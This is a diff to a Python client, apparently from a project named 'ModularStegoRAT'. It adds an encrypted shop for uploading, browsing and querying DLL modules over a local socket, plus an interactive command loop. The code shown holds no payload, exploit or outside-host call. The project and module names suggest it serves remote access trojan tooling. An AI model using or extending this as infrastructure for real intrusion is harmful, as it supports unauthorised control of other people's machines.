@@ -14,6 +14,8 @@ DATABASE_CONNECTION_HOST = "127.0.0.1"
 DATABASE_CONNECTION_PORT = 12345
 KEYFILE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Python"
 DB_INIT_SIZE_BYTES = 1024
+DB_SHOP_SIZE_BYTES_CLIENT = 1024
+DB_SHOP_SIZE_BYTES_SERVER = 8192
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
     oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
@@ -183,14 +185,186 @@ def UploadNewModule(moduleName : str, DLLPath : str, description : str, username
         
     dbSocket.shutdown(socket.SHUT_RDWR)
     dbSocket.close()
-        
 
-DefineNewUser("TestUser", "TestPass")
-UploadNewModule(
-    "TestMod1", 
-    "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\FullSystemModule\\x64\\Debug\\FullSystemModule.dll", 
-    "This is a test mod", 
-    "TestUser", 
-    "TestPass", 
-    publicKeyBytes, 
-    "")
+def StartShop() -> tuple[AESGCM, socket.socket, bytes]:
+    aes, dbSocket = InitServerConnection()
+    
+    seedNonce = os.urandom(12)
+    request = json.dumps({
+        "Nonce": base64.b64encode(seedNonce).decode(), 
+        "Type" : base64.b64encode(aes.encrypt(seedNonce, "OPEN_SHOP".encode(), None)).decode(),
+    })
+    
+    request = request.encode().ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    dbSocket.send(request)
+    
+    return (aes, dbSocket, seedNonce)
+
+def CloseShop(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int):    
+    request = json.dumps({
+        "Type" : "CLOSE_SHOP"
+    }).encode()
+    
+    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    shopSocket.send(request)
+    
+    shopSocket.shutdown(socket.SHUT_RDWR)
+    shopSocket.close()
+
+def ReformatTimestamp(oldTimestamp : str) -> str:
+    timestampSplit = oldTimestamp.split("-")
+    newTimestamp = f"{timestampSplit[2]}/{timestampSplit[1]}/{timestampSplit[0]} {timestampSplit[3]}:{timestampSplit[4]}:{timestampSplit[5]} (UTC)" 
+    return newTimestamp
+
+def BrowseShop(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int, pageNo : int = 0, entriesPerPage : int = 16) -> int:    
+    request = json.dumps({
+        "Type" : "BROWSE_SHOP",
+        "Page Number" : pageNo,
+        "Entries Number" : entriesPerPage 
+    }).encode()
+    
+    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    shopSocket.send(request)
+    
+    response = shopSocket.recv(DB_SHOP_SIZE_BYTES_SERVER).rstrip(b"\0")
+    response = shopAES.decrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement + 1), response, None).decode()
+    response = json.loads(response)
+    
+    print(response["Status"])
+    
+    entries = response["Entries"]
+    print("-"*20)
+    for entry in entries:
+        print(
+f"""
+ID: {entry["Module ID"]}
+Name: {entry["Module Name"]}
+Owner : {entry["Module Owner Username"]}
+Version : {entry["Module Version"]}
+Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
+Dependencies : {entry["Dependencies"] if (entry["Dependencies"] != '""') else "None"}
+
+Description:
+{entry["Module Description"]} 
+""")
+        
+        print("-"*20)
+    
+    return shopSeedNonceIncrement + 2
+    
+publicKey, publicKeyBytes, privateKey, privateKeyBytes = CreateECCKeypair()
+
+def ModuleQuery(shopAES : AESGCM, shopSocket : socket.socket, shopSeedNonce : bytes, shopSeedNonceIncrement : int, queryType : str, query : str) -> int:
+    request = json.dumps({
+        "Type" : "MODULE_QUERY",
+        "Query Type" : queryType,
+        "Query" : query 
+    }).encode()
+    
+    request = shopAES.encrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement), request, None).ljust(DB_SHOP_SIZE_BYTES_CLIENT, b"\0")
+    shopSocket.send(request)
+    
+    response = shopSocket.recv(DB_SHOP_SIZE_BYTES_SERVER).rstrip(b"\0")
+    response = shopAES.decrypt(IncrementNonce(shopSeedNonce, shopSeedNonceIncrement + 1), response, None).decode()
+    response = json.loads(response)
+    
+    print(response["Status"])
+    
+    entries = response["Entries"]
+    print("-"*20)
+    for entry in entries:
+        print(
+f"""
+ID: {entry["Module ID"]}
+Name: {entry["Module Name"]}
+Owner : {entry["Module Owner Username"]}
+Version : {entry["Module Version"]}
+Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
+Dependencies : {entry["Dependencies"] if (entry["Dependencies"] != '""') else "None"}
+
+Description:
+{entry["Module Description"]} 
+""")
+        
+        print("-"*20)
+    
+    return shopSeedNonceIncrement + 2
+
+def ShowHelpDisplay():
+    print(
+"""
+List of all commands:
+.define [username] [password] - Defines a new user
+.upload [module name] [local DLL path] [description] [username] [password] [dependencies IDs] - Uploads a new module
+.openShop - Opens a shop connection (run this before shopping)
+.browseShop - Browses the shop
+.browseShopNext - Goes to the next page of the shop
+.browseShopPrevious - Goes to the previous page of the shop
+.browseShopSetPage [page number] - Goes to a set page number of the shop
+.moduleQuery [query type - ID, Name or Description] [query] - Queries about modules
+.closeShop - Closes the shop connection
+.quit - Quits the system
+.help - Brings up all available commands
+""")
+
+running = True
+shopping = False
+currentShopPage = -1
+
+print("Welcome! Input .help to start")
+while running:
+    userInput = input().split(" ")
+    if(userInput[0] == ".define" and (not shopping)):
+        DefineNewUser(userInput[1], userInput[2])
+    
+    elif(userInput[0] == ".upload" and (not shopping)):
+        UploadNewModule(
+            userInput[1], 
+            userInput[2], 
+            userInput[3], 
+            userInput[4], 
+            userInput[5], 
+            publicKeyBytes, 
+            userInput[6]
+        )
+
+    elif(userInput[0] == ".openShop" and (not shopping)):
+        shopAES, shopSocket, shopSeedNonce = StartShop()
+        shopSeedNonceIncrement = 1
+        shopping = True
+    
+    elif(userInput[0] == ".browseShop" and shopping):
+        if(currentShopPage == -1):
+            currentShopPage = 0
+        
+        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
+    
+    elif(userInput[0] == ".browseShopNext" and shopping):
+        currentShopPage += 1
+        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
+    
+    elif(userInput[0] == ".browseShopPrevious" and shopping):
+        currentShopPage -= 1
+        if(currentShopPage < 0):
+            currentShopPage = 0
+        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
+    
+    elif(userInput[0] == ".browseShopSetPage" and shopping):
+        currentShopPage = int(userInput[1])
+        shopSeedNonceIncrement = BrowseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, pageNo=currentShopPage)
+    
+    elif(userInput[0] == ".moduleQuery" and shopping):
+        shopSeedNonceIncrement = ModuleQuery(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement, userInput[1], userInput[2])
+    
+    elif(userInput[0] == ".closeShop" and shopping):
+        CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
+        shopping = False
+    
+    elif(userInput[0] == ".quit"):
+        running = False
+        if(shopping):
+            CloseShop(shopAES, shopSocket, shopSeedNonce, shopSeedNonceIncrement)
+            shopping = False
+    
+    elif(userInput[0] == ".help"):
+        ShowHelpDisplay()
